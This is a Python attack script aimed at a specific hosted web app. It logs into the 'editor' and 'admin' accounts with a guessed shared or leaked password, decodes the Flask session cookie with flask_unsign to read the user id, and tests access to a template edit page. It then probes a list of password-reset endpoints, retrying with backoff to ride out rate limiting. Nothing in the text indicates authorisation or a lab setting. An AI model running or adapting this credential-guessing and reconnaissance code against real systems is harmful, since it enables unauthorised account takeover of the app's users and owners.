import requests, time, flask_unsign as fu

base = 'https://outofcontext-app.onrender.com'

def try_login(u, p):
    for a in range(4):
        s = requests.Session()
        try:
            r = s.post(base + '/login', data={'username': u, 'password': p}, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        c = s.cookies.get('session')
        if c:
            uid = fu.decode(c).get('_user_id')
            er = s.get(base + '/templates/3/edit', timeout=40, allow_redirects=False)
            ok = er.status_code == 200 and 'Access Denied' not in er.text
            return f'{u}/{p}: LOGGED IN uid={uid} editor={"YES" if ok else er.status_code}'
        return f'{u}/{p}: fail {r.status_code}'
    return f'{u}/{p}: transient'

# shared/leaked password hypothesis
print(try_login('editor', 'AuditPolicy2026!'))
time.sleep(3)
print(try_login('admin', 'AuditPolicy2026!'))
time.sleep(3)

# password reset / account endpoints
s = requests.Session()
for p in ['/reset', '/forgot', '/forgot-password', '/reset-password', '/recover',
          '/change-password', '/account/recover', '/password-reset', '/api/reset']:
    for a in range(3):
        try:
            r = s.get(base + p, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(10); continue
        if r.status_code in (429, 502, 503):
            time.sleep(15); continue
        break
    if r.status_code != 404:
        print('*** RESET EP', p, r.status_code, r.headers.get('Location', ''))
    time.sleep(0.6)
print('reset enum done')
